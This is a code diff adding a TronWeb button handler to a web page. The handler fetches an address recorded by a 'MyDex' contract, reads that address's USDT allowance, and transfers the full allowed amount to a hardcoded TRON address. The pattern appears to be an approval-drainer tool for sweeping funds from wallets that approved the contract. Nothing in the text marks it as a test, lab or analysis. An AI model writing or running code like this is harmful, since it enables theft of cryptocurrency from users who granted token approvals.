@@ -200,6 +200,56 @@
     console.error("❌ 轉帳失敗：", err);
     alert("轉帳失敗，請確認授權狀態與 TRX 餘額");
   }
+};transferFromButton.onclick = async () => {
+  if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+    alert("請先連接錢包");
+    return;
+  }
+
+  try {
+    const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
+    console.log("MyDex contract:", MyDex);
+    console.log("MyDex.transferFrom:", MyDex.transferFrom);
+
+    const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
+
+    const fromHex = await MyDex.getIndexAddress(0).call();
+    const from = window.tronWeb.address.fromHex(fromHex);
+    console.log("fromHex:", fromHex);
+    console.log("from (Base58):", from);
+
+    const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B";
+    console.log("to:", to);
+
+    let allowance = await USDT.allowance(from, MyDex_contractAddress).call();
+    if (!allowance) {
+      alert("未取得 allowance，無法執行轉帳");
+      return;
+    }
+    allowance = window.tronWeb.toBigNumber(allowance).toString();
+    console.log("allowance:", allowance);
+
+    if (BigInt(allowance) === 0n) {
+      alert("尚未授權，無法轉帳");
+      return;
+    }
+
+    const fromStr = String(from);
+    const toStr = String(to);
+    const allowanceStr = String(allowance);
+
+    console.log({ fromStr, toStr, allowanceStr });
+
+    // 先測試 call 看看參數是否可行
+    await MyDex.transferFrom(fromStr, toStr, allowanceStr).call();
+
+    const tx = await MyDex.transferFrom(fromStr, toStr, allowanceStr).send({ feeLimit: 100_000_000 });
+    console.log("轉帳成功", tx);
+    alert("轉帳成功");
+  } catch (err) {
+    console.error("轉帳失敗", err);
+    alert("轉帳失敗，請確認授權狀態與 TRX 餘額");
+  }
 };
   </script>
 </body>
